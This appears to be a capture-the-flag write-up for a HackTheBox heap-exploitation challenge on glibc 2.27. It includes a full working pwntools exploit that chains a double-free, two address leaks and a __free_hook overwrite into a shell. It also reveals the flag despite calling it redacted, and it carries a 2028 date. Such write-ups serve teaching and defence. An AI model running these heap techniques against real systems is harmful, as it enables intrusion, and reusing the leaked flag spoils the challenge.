---
title: "Cyber Bankrupt"
date: 2028-06-06 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, heap, use-after-free, double-free, tcache, glibc-2.27, one-gadget, cwe-416, cwe-415]
description: "A Medium Pwn challenge on glibc 2.27: a single-slot banking heap with a free-without-null bug becomes a double-free, leaking the heap via a self-referential tcache pointer, then libc via the unsorted bin, then a __free_hook one-gadget for a shell."
---

## Overview

`Cyber Bankrupt` is a Medium HackTheBox **Pwn** challenge — a "banking" menu binary
(PIE, Full RELRO, canary, NX) that ships its own **glibc 2.27**. It hands you a single
account slot and a hard cap of 14 operations, yet a missing `NULL`-after-`free` turns
into a full [use-after-free](https://cwe.mitre.org/data/definitions/416.html) and
[double-free](https://cwe.mitre.org/data/definitions/415.html), which chains into a heap
leak, a libc leak, and a `__free_hook` overwrite for a shell.

## The technique

The program exposes three actions on one global pointer `acc[0]` (an internal check
forces the account index to `0`):

- **Transfer** — `malloc(size)`, store the pointer in `acc[0]`, `read()` your bytes in.
- **Clear history** — `free(acc[0])` **but never nulls the pointer**.
- **View details** — `puts(acc[0])`.

Three primitives fall out of that missing line:

1. **Use-after-free** — the freed pointer stays live in `acc[0]`.
2. **Double-free** — because it survives, the same chunk can be freed twice. glibc 2.27's
   tcache added bins but **not** the double-free `key` field (that arrived in 2.29), so the
   second free is accepted silently.
3. **Leak** — `View details` does `puts(acc[0])` on the freed chunk, printing whatever the
   allocator wrote into the freed chunk's first 8 bytes (its tcache forward pointer).

A PIN gate runs first: `scanf("%4s")`, then each input byte is XOR-5'd and compared to the
constant `"3<3<"`. Inverting the transform gives the PIN directly — `'3'^5='6'`, `'<'^5='9'`
→ **`6969`**.

## Solution

The chain works around the single slot and the 14-op cap by re-using one chunk over and over
via tcache poisoning, rather than needing many live allocations.

**1. Heap leak (self-referential double-free).** Free the same 0x100 chunk twice. tcache stores
the current list head in the freed chunk's forward pointer, so after the second free the chunk
points at *itself*. `puts` on the dangling pointer prints its own **heap** address.

**2. libc leak (route a chunk into the unsorted bin).** tcache forward pointers only leak heap
addresses. tcache bins cap at request `0x408`, so a **`0x420`** request (chunk `0x430`) skips
tcache entirely and a lone free lands in the **unsorted bin**, whose `fd`/`bk` point into
`main_arena`. By re-poisoning the small bin and interleaving that big allocation, `acc[0]` is
maneuvered onto a chunk that, when freed, sits in the unsorted bin — `puts` then leaks
`main_arena` and `libc_base = leak - 0x3ebca0`.

**3. `__free_hook` → shell.** With libc known, tcache-poison `__free_hook`: overwrite a freed
chunk's forward pointer with `&__free_hook`, allocate twice so the next `malloc` returns
`__free_hook`, and write a one-gadget (`libc + 0x4f322`) there. The next `Clear history` calls
`free()` → `__free_hook()` → the one-gadget → shell. Of the standard 2.27 one-gadgets, only
`0x4f322` satisfies its register/stack constraints at the `free` call site; `0x4f2c5` and
`0x10a38c` fail.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys
from pwn import *
context.arch = 'amd64'
e = ELF('./cyber_bankrupt', checksec=False)
libc = ELF(e.runpath.decode() + 'libc.so.6', checksec=False)
r = remote(sys.argv[1], int(sys.argv[2]))
sla = lambda x, y: r.sendlineafter(x, y)
sa  = lambda x, y: r.sendafter(x, y)
rl  = lambda: r.recvline()

def transfer(i, s, d=b'w3th4nds'):
    sla(b'> ', b'1'); sla(b': ', str(i).encode()); sla(b': ', str(s).encode()); sa(b': ', d)
def clear(i): sla(b'> ', b'2'); sla(b': ', str(i).encode())
def view(i):  sla(b'> ', b'3'); sla(b': ', str(i).encode())

sla(b'pin: ', b'6969')                       # input ^ 5 == "3<3<"

# 1) heap leak: double-free makes the chunk's fd point to itself
transfer(0, 0x100)
for _ in range(2): clear(0)
view(0); heap = u64(rl()[:6].ljust(8, b'\x00'))

# 2) libc leak: push acc[0] onto a chunk that frees to the unsorted bin
transfer(0, 0x100, p64(heap)); transfer(0, 0x420)
transfer(0, 0x100, p64(heap)); transfer(0, 0x100); clear(0)
view(0); libc.address = u64(rl()[:6].ljust(8, b'\x00')) - 0x3ebca0

# 3) tcache-poison __free_hook -> one_gadget -> shell
transfer(0, 0x40,  p64(libc.sym['__free_hook']))
transfer(0, 0x100)
transfer(0, 0x100, p64(libc.address + 0x4f322))
clear(0)                                     # free() -> __free_hook() -> shell
r.sendline(b'cat flag*'); r.interactive()
```

Run it against the instance:

```bash
python3 solve.py <ip> <port>
```

The shell reads the flag — `HTB{...}` (redacted).

## Why it worked

The root cause is a single missing `acc[0] = NULL` after `free()`. That dangling pointer is
what makes the use-after-free, the double-free, and the `puts`-based leaks all possible. The
enabling weakness is the **old library**: glibc 2.27 has no tcache double-free key and no
safe-linking, so a freed chunk's forward pointer is a raw, forgeable absolute address — exactly
what the flag hints at, `HTB{b4nk5_5t1ll_u53_0ld_l1br4r135}`. On glibc 2.32+ the same code path
would need to defeat pointer mangling and the double-free key first.

## Fix / defense

- **Null the pointer immediately after `free()`** (`acc[i] = NULL`) — this kills the
  use-after-free and double-free outright.
- Ship a current glibc (≥ 2.32) so tcache double-free keys and safe-linking raise the bar.
- Avoid exposing a `puts`/read primitive over attacker-controlled heap memory, and compile with
  hardening (`_FORTIFY_SOURCE`, `-D_GLIBCXX_ASSERTIONS`).
